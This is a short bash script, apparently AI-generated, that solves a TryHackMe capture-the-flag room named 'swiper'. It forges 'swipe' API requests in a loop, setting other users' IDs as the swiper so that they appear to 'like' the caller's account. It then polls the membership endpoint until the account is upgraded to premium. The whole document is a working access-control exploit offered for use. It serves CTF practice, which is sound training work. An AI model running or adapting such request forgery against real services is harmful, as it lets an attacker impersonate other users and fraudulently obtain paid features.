# script by ChatGPT
# script for tryhackme room swiper https://tryhackme.com/room/lafbctf2026-advanced
# YouTube video walk through: https://youtu.be/AMt5Tk_YsHc
# you need to : export TOKEN=""

#!/usr/bin/env bash
set -u

BASE="https://10-81-118-246.reverse-proxy.cell-prod-eu-west-1b.vm.tryhackme.com"
TOKEN="${TOKEN:?export TOKEN=...}"

# how far to try; bump to 200/300 if needed
END=220
SLEEP=0.12

MYID=$(curl -s --max-time 10 -H "Authorization: Bearer $TOKEN" "$BASE/profile" | jq -r .id)
echo "[*] My ID: $MYID"

check_membership () {
  curl -s --max-time 10 -H "Authorization: Bearer $TOKEN" "$BASE/membership"
}

echo "[*] Starting membership:"
check_membership | jq -c .
echo

for sid in $(seq 1 "$END"); do
  [[ "$sid" == "$MYID" ]] && continue

  # forge: sid -> me
  resp=$(curl -s --max-time 10 -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    --data-binary "{\"swiper_id\":$sid,\"swiped_id\":$MYID,\"liked\":true}" \
    "$BASE/swipe" || true)

  # ignore common noisy errors
  if echo "$resp" | grep -qiE 'already swiped|database is locked'; then
    sleep "$SLEEP"
    continue
  fi

  # check every 10
  if (( sid % 10 == 0 )); then
    mem=$(check_membership)
    lc=$(echo "$mem" | jq -r .like_count)
    prem=$(echo "$mem" | jq -r .is_premium)
    sub=$(echo "$mem" | jq -r '.subscription_id // ""')
    echo "[*] sid=$sid -> like_count=$lc premium=$prem $sub"

    if [[ "$prem" == "true" ]]; then
      echo "[+] Premium reached!"
      echo "$mem" | jq -c .
      exit 0
    fi
  fi

  sleep "$SLEEP"
done

echo "[!] Finished range 1..$END. Current membership:"
check_membership | jq -c .
